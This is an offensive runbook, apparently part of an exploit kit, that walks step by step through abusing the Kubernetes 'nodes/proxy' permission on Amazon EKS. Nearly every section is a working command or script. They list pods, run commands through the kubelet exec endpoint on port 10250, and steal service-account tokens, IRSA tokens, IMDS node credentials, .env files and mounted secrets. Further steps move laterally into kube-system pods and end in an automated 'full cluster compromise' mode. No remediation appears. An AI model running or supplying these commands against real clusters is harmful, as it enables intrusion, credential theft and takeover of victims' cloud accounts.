# EKS nodes/proxy — Step-by-Step Exploit Commands

> Run these ONE BY ONE after recon.
> Two-stage attack: API server for recon → Direct kubelet for exec.

---

## Prerequisites

```bash
# Install websocat (WebSocket CLI — needed for manual exec)
# Already installed? check: websocat --version
curl -L https://github.com/vi/websocat/releases/download/v1.13.0/websocat.x86_64-unknown-linux-musl \
  -o /usr/local/bin/websocat && chmod +x /usr/local/bin/websocat

# Install websocket-client (needed for Python exploit)
pip3 install websocket-client
```

---

## Setup Variables

```bash
# ─── CHANGE THESE ───
export EKS_SERVER="https://ABCDE12345.gr7.us-east-1.eks.amazonaws.com"
export TOKEN="eyJhbGciOiJSUzI1NiIs..."

# After recon (from 01-MANUAL-RECON.md)
export NODE="ip-10-0-1-42.us-east-1.compute.internal"   # target node
export NODE_IP="10.0.1.42"                                # node's internal IP
export KUBELET="https://$NODE_IP:10250"                   # kubelet endpoint
```

---

## STAGE 1: Pod Enumeration (API Server)

```bash
# This works because you have "get nodes/proxy"
# The API server proxies the HTTP GET to the kubelet

# COMMAND 1: List all pods on the node
curl -sk --http1.1 \
  -H "Authorization: Bearer $TOKEN" \
  "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | \
  jq -r '.items[] | .metadata.namespace + "/" + .metadata.name + " [" + .spec.containers[0].name + "]"'
```

Pick a target from the output. Example:

```bash
# Set your target
export TARGET_NS="production"
export TARGET_POD="webapp-deployment-6f4b8c7d9-abc12"
export TARGET_CONTAINER="webapp"
```

---

## STAGE 2: RCE via Direct Kubelet

### Why Direct Kubelet?

The API server proxy path doesn't forward WebSocket query params correctly.
So we connect to the kubelet directly on port 10250.

In EKS, kubelet 10250 is accessible from any pod in the same VPC
(the default Security Group allows it).

---

### Method A: Using websocat (Manual, One Command at a Time)

```bash
# COMMAND 2: Run 'id' in the target pod
websocat -k -1 \
  --ws-c-uri "wss://$NODE_IP:10250/exec/$TARGET_NS/$TARGET_POD/$TARGET_CONTAINER?command=id&output=1&error=1&stdout=1&stderr=1" \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  wss://$NODE_IP:10250/exec/$TARGET_NS/$TARGET_POD/$TARGET_CONTAINER?command=id&output=1&error=1&stdout=1&stderr=1
```

> **Note:** The output has binary channel bytes prepended. The first byte of each message
> is the channel (1=stdout, 2=stderr, 3=exit). This will look slightly garbled in raw websocat.
> Use the Python exploit for clean output.

---

### Method B: Using Python One-Liner (Clean Output)

```bash
# COMMAND 3: Run 'id' (clean output)
python3 -c "
import websocket, ssl, json, sys
url = 'wss://$NODE_IP:10250/exec/$TARGET_NS/$TARGET_POD/$TARGET_CONTAINER?command=id&output=1&error=1&stdout=1&stderr=1'
ws = websocket.create_connection(url,
    header=['Authorization: Bearer $TOKEN'],
    subprotocols=['v4.channel.k8s.io'],
    sslopt={'cert_reqs': ssl.CERT_NONE}, timeout=10)
while True:
    try:
        _, data = ws.recv_data()
        if not data: break
        ch, payload = data[0], data[1:]
        if ch in (1,2): print(payload.decode(), end='')
        elif ch == 3: break
    except: break
ws.close()
"
```

---

### Method C: Using the EKS Exploit Script (Recommended)

```bash
# COMMAND 4: Run 'id' via exploit script
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER --command "id"

# COMMAND 5: Run 'env' to extract secrets
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER --command "env"
```

---

## STEP-BY-STEP EXPLOITATION (Run in Order)

### Step 1: Dump Environment Variables (Find Secrets)

```bash
# COMMAND 6: Get all env vars
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER \
  --command "env"

# Or manual:
python3 -c "
import websocket, ssl
url = 'wss://$NODE_IP:10250/exec/$TARGET_NS/$TARGET_POD/$TARGET_CONTAINER?command=env&output=1&error=1&stdout=1&stderr=1'
ws = websocket.create_connection(url, header=['Authorization: Bearer $TOKEN'], subprotocols=['v4.channel.k8s.io'], sslopt={'cert_reqs': ssl.CERT_NONE}, timeout=10)
while True:
    try:
        _, d = ws.recv_data()
        if not d: break
        if d[0] in (1,2): print(d[1:].decode(), end='')
        elif d[0] == 3: break
    except: break
ws.close()
"
```

### Step 2: Steal Kubernetes ServiceAccount Token

```bash
# COMMAND 7: Read the SA token
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER \
  --command "cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# COMMAND 8: Check what the stolen token can do
STOLEN_TOKEN=$(python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER \
  --command "cat /var/run/secrets/kubernetes.io/serviceaccount/token" 2>/dev/null)

kubectl auth can-i --list --token="$STOLEN_TOKEN" --server="$EKS_SERVER" 2>/dev/null | head -20
```

### Step 3: Steal IRSA Token (AWS IAM Role)

```bash
# COMMAND 9: Check if IRSA is configured
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER \
  --command "env" 2>/dev/null | grep -E "AWS_|ROLE_ARN"

# COMMAND 10: Steal IRSA JWT token
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER --steal-irsa

# COMMAND 11: Decode the IRSA token to see the IAM role
IRSA_TOKEN=$(python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER \
  --command "cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token" 2>/dev/null)

echo "$IRSA_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# COMMAND 12: Use IRSA token to get AWS credentials
# Extract the role ARN from the decoded token, then:
aws sts assume-role-with-web-identity \
  --role-arn "arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME" \
  --role-session-name "exploit" \
  --web-identity-token "$IRSA_TOKEN" \
  --region us-east-1
```

### Step 4: Steal IMDS Node Credentials (From HostNetwork Pod)

```bash
# First, find a hostNetwork pod (aws-node is always hostNetwork on EKS)
# COMMAND 13: Find aws-node pod
curl -sk --http1.1 -H "Authorization: Bearer $TOKEN" \
  "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | \
  jq -r '.items[] | select(.spec.hostNetwork == true) | .metadata.namespace + "/" + .metadata.name'

# Set the hostNetwork target (aws-node is in every EKS node)
export HOSTNET_NS="kube-system"
export HOSTNET_POD="aws-node-xxxxx"       # replace with actual name
export HOSTNET_CONTAINER="aws-node"

# COMMAND 14: Steal IMDS credentials via the hostNetwork pod
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $HOSTNET_NS -p $HOSTNET_POD -c $HOSTNET_CONTAINER --steal-imds

# Or manually, step by step:

# COMMAND 15: Get IMDSv2 session token
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $HOSTNET_NS -p $HOSTNET_POD -c $HOSTNET_CONTAINER \
  --command "sh -c curl -s -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600"

# COMMAND 16: Get IAM role name
# Replace IMDS_TOKEN with the output from command 15
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $HOSTNET_NS -p $HOSTNET_POD -c $HOSTNET_CONTAINER \
  --command "sh -c curl -s -H X-aws-ec2-metadata-token:IMDS_TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# COMMAND 17: Get full credentials
# Replace ROLE_NAME with the output from command 16
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $HOSTNET_NS -p $HOSTNET_POD -c $HOSTNET_CONTAINER \
  --command "sh -c curl -s -H X-aws-ec2-metadata-token:IMDS_TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
```

### Step 5: Extract Application Secrets

```bash
# COMMAND 18: Read filesystem secrets
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER \
  --command "find / -name '*.env' -o -name '.env*' -o -name 'credentials' -o -name '*.key' -o -name '*.pem' 2>/dev/null"

# COMMAND 19: Read AWS credentials file (if exists)
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER \
  --command "cat /root/.aws/credentials 2>/dev/null || cat /home/*/.aws/credentials 2>/dev/null || echo 'not found'"

# COMMAND 20: Dump config files
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER \
  --command "cat /app/.env 2>/dev/null || cat /etc/app/config 2>/dev/null || echo 'no config found'"

# COMMAND 21: Read mounted secrets
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER \
  --command "ls -la /var/run/secrets/ 2>/dev/null && find /var/run/secrets/ -type f -exec echo '--- {} ---' \\; -exec cat {} \\; 2>/dev/null"
```

### Step 6: Lateral Movement (Cross-Namespace RCE)

```bash
# COMMAND 22: Exec into kube-system pods
# list kube-system pods on the node
curl -sk --http1.1 -H "Authorization: Bearer $TOKEN" \
  "$EKS_SERVER/api/v1/nodes/$NODE/proxy/pods" | \
  jq -r '.items[] | select(.metadata.namespace=="kube-system") | .metadata.name + " [" + .spec.containers[0].name + "]"'

# COMMAND 23: RCE into kube-proxy (runs on every EKS node)
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n kube-system -p kube-proxy-xxxxx -c kube-proxy --command "id"

# COMMAND 24: RCE into coredns (has cluster DNS access)
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n kube-system -p coredns-xxxxx -c coredns --command "id"
```

### Step 7: Full Auto-Exploit (All Nodes, All Pods)

```bash
# COMMAND 25: Run full auto-exploit
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --auto
```

### Step 8: Interactive Shell

```bash
# COMMAND 26: Get a pseudo-shell in any pod
python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node $NODE \
  -n $TARGET_NS -p $TARGET_POD -c $TARGET_CONTAINER --interactive
```

---

## Quick Reference: Attack Chain

```
┌─────────────────────────────────┐
│  You: readonly user with        │
│  "get nodes/proxy" only         │
└──────────┬──────────────────────┘
           │
           ▼
┌─────────────────────────────────┐
│ STAGE 1: API Server Recon       │
│ GET /nodes/NODE/proxy/pods      │
│ → Lists ALL pods (all ns)       │
│ → Identifies IRSA, privileged,  │
│   hostNetwork targets           │
└──────────┬──────────────────────┘
           │
           ▼
┌─────────────────────────────────┐
│ STAGE 2: Direct Kubelet Exec    │
│ WSS node-ip:10250/exec/ns/pod   │
│ → Full RCE in any pod           │
└──────────┬──────────────────────┘
           │
     ┌─────┴──────┬──────────────┬──────────────┐
     ▼            ▼              ▼              ▼
┌─────────┐ ┌──────────┐  ┌──────────┐  ┌──────────┐
│ Steal   │ │ Steal    │  │ Steal    │  │ Read App │
│ SA      │ │ IRSA     │  │ IMDS     │  │ Secrets  │
│ Tokens  │ │ Tokens   │  │ Node     │  │ env/file │
│         │ │ (AWS IAM)│  │ Creds    │  │          │
└────┬────┘ └────┬─────┘  └────┬─────┘  └──────────┘
     │           │              │
     ▼           ▼              ▼
  K8s API     AWS API        AWS API
  access      access         (node role =
  as pod's    as pod's       EC2, EKS,
  SA          IAM role       ECR, etc.)
```

---

## EKS-Specific Notes

| Topic | Detail |
|---|---|
| **Kubelet port** | 10250, open within VPC by default |
| **Node naming** | `ip-10-0-X-X.REGION.compute.internal` |
| **IRSA path** | `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` |
| **IMDS** | `169.254.169.254` — IMDSv2 requires PUT for token first |
| **IMDS hop limit** | EKS sets hop-limit=1 (only hostNetwork pods can reach it) |
| **aws-node pod** | Always present, hostNetwork=true, can reach IMDS |
| **Node IAM role** | Typically has ECR pull, EC2 describe, EKS describe perms |
| **WebSocket params** | MUST include `output=1&error=1&stdout=1&stderr=1` (all 4) |
| **WebSocket subprotocol** | `v4.channel.k8s.io` |
| **Channel bytes** | 1=stdout, 2=stderr, 3=exit status |

---

**Next:** Run `--auto` for full cluster compromise or pick specific targets from recon.
